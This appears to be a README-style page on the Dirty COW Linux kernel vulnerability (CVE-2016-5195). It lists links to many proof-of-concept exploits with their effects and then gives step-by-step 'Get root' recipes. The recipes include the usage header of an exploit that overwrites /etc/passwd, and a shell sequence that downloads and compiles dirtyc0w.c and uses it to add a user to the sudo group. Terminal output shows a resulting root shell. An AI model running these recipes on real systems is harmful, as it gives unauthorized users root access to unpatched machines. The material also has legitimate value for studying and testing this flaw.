#List of PoCs

https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c
Allows user to write on files meant to be read only.
https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679
Gives the user root by overwriting /usr/bin/passwd or a suid binary.
https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2
Gives the user root by patching libc's getuid call and invoking su.
https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
Allows user to write on files meant to be read only.
https://github.com/xlucas/dirtycow.cr
Allows a user to write on files meant to be read only.
https://github.com/timwr/CVE-2016-5195
Allows user to write on files meant to be read only (android).
https://github.com/rapid7/metasploit-framework/pull/7476
Metasploit module based on the cowroot PoC.
https://github.com/scumjr/dirtycow-vdso
Gives the user root by patching the vDSO escapes containers/SELinux doesn't need suid.
https://gist.github.com/mak/c36136ccdbebf5ecfefd80c0f2ed6747
Gives the user root by injecting shellcode into a SUID file.
https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
Gives the user root by injecting shellcode into a SUID file using PTRACE_POKEDATA .
https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2
Gives the user root by replacing /etc/passwd
https://gist.github.com/chriscz/f1aca56cf15cfb7793db0141c15718cd
Allows user to write on files meant to be read only. Supports writing to multiple pages, not just the first
https://github.com/nowsecure/dirtycow
Allows the user to write on files meant to be read only, implemented as a radare2 IO plugin.
https://github.com/sivizius/dirtycow.fasm
Gives the user root by injecting shellcode into a SUID file. implemented for amd64 in flatassembly.
https://github.com/gbonacini/CVE-2016-5195
Gives the user root by replacing /etc/passwd
https://github.com/mengzhuo/dirty-cow-golang/blob/master/dirtyc0w.go
Allows user to write on files meant to be read only. implemented for arm32/x86/amd64 in Golang faster than c implement.
https://github.com/FireFart/dirtycow/blob/master/dirty.c
Generates a new password hash on the fly and modifies /etc/passwd automatically. Just run and pwn.
https://github.com/sideeffect42/DirtyCOWTester
Runs exploit and tells user if his system is vulnerable by writing to a read-only file (usually /tmp/dirtycow_test). Also has a --no-root option that does not require superuser.

#Get root
##1. https://github.com/gbonacini/CVE-2016-5195

Link clone: 
https://github.com/linhlt247/CVE-2016-5195

How to run: Please read README.md

After exploit, password root is **dirtyCowFun**

Video: https://www.youtube.com/watch?v=b6PGynVqkAY#t=139.100041

##2. https://github.com/FireFart/dirtycow/blob/master/dirty.c

Link clone: https://github.com/linhlt247/dirtycow/blob/master/dirty.c

How to run: Please read source code dirty.c

```sh
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//
```

##3. Edit file `/etc/group`, add `sudo` for user.
test5 is user

```sh
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc dirtyc0w.c -o dirtyc0w -lpthread
./dirtyc0w /etc/group "$(sed '/\(sudo*\)/ s/$/,test5/' /etc/group)"
```
Before run:
```sh
adk@adk:~> cat /etc/group | grep sudo
sudo:x:27:adk

test@adk:/home/adk$ sudo su
[sudo] password for test:
test is not in the sudoers file.  This incident will be reported.
```

After run:
```sh
adk@adk:~> cat /etc/group | grep sudo
sudo:x:27:adk,test

adk@adk:~> su test
Password:
groups: cannot find name for group ID 1002
test@adk:/home/adk$ sudo su
[sudo] password for test:
root@adk:/home/adk#
```

Reference https://www.youtube.com/watch?v=4ndTKirIpfc



